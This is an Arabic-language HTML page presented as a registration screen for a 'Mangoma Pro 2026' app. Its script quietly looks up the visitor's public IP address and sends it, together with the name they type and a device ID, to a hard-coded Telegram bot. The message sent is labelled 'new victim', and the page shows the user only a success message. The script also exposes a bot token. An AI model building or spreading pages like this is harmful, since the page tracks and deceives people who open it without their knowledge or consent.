<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mangoma System</title>
    <style>
        body { background-color: #121212; color: #fff; font-family: Tahoma, sans-serif; text-align: center; padding: 20px; }
        .box { border: 1px solid #00ff00; padding: 20px; border-radius: 10px; background: #1e1e1e; max-width: 400px; margin: auto; }
        input { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; text-align: center; }
        button { width: 95%; padding: 10px; background: #00ff00; color: #000; border: none; font-weight: bold; border-radius: 5px; cursor: pointer; }
        h2 { color: #00ff00; }
        .hidden { display: none; }
    </style>
</head>
<body>

    <div class="box">
        <h2>🚀 Mangoma Pro 2026</h2>
        
        <!-- شاشة التسجيل (بتظهر اول مرة) -->
        <div id="loginScreen">
            <p>⚠ يجب تسجيل اسمك لفتح التطبيق</p>
            <input type="text" id="username" placeholder="اكتب اسمك هنا...">
            <button onclick="startHack()" id="btnSend">تسجيل ودخول</button>
            <p id="status" style="color:yellow; font-size:12px;"></p>
        </div>

        <!-- شاشة التطبيق (بعد ما يسجل) -->
        <div id="appScreen" class="hidden">
            <h3>✅ تم التفعيل</h3>
            <p>الاسم: <span id="showName" style="color:#00ff00"></span></p>
            <p>ID: <span id="showID"></span></p>
            <hr>
            <p>التطبيق يعمل الآن...</p>
        </div>
    </div>

<script>
    // ---------------- إعداداتك الخاصة ----------------
    // دي البيانات اللي انت بعتها في الصور بتاعتك
    const BOT_TOKEN = "8596993745:AAG0FXH8LFqweLH5nlPTcFpEM07BHhabrHw";
    const CHAT_ID = "-1003886528114"; 
    // --------------------------------------------------

    // بنعمل آيدي وهمي للجهاز عشان نعرف نميزه
    let deviceID = localStorage.getItem("myID");
    if (!deviceID) {
        deviceID = "ID-" + Math.floor(Math.random() * 999999);
        localStorage.setItem("myID", deviceID);
    }

    // لو المستخدم مسجل قبل كده، ندخله علطول
    if (localStorage.getItem("myName")) {
        showApp(localStorage.getItem("myName"));
    }

    // دي الدالة اللي بتشتغل لما يدوس زرار
    function startHack() {
        const name = document.getElementById("username").value;
        if (name.length < 3) {
            alert("اكتب اسم صحيح!");
            return;
        }

        document.getElementById("btnSend").disabled = true;
        document.getElementById("status").innerText = "جاري الاتصال بالسيرفر...";

        // 1. نجيب الـ IP
        fetch("https://api.ipify.org?format=json")
        .then(res => res.json())
        .then(data => {
            const ip = data.ip;
            // 2. نبعت البيانات للتليجرام
            sendToTelegram(name, ip);
        })
        .catch(err => {
            // لو فشل يجيب الـ IP نبعت برضه بس نقول غير معروف
            sendToTelegram(name, "غير معروف (فشل السحب)");
        });
    }

    function sendToTelegram(name, ip) {
        const text = `
🔥 <b>ضحية جديدة (Mangoma App)</b>
━━━━━━━━━━━━
👤 <b>الاسم:</b> ${name}
🆔 <b>ID:</b> <code>${deviceID}</code>
🌍 <b>IP:</b> <code>${ip}</code>
━━━━━━━━━━━━
        `;

        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

        fetch(url, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
        })
        .then(res => {
            localStorage.setItem("myName", name);
            document.getElementById("status").innerText = "تم التسجيل بنجاح!";
            setTimeout(() => showApp(name), 1500);
        });
    }

    function showApp(name) {
        document.getElementById("loginScreen").classList.add("hidden");
        document.getElementById("appScreen").classList.remove("hidden");
        document.getElementById("showName").innerText = name;
        document.getElementById("showID").innerText = deviceID;
    }
</script>

</body>
</html>
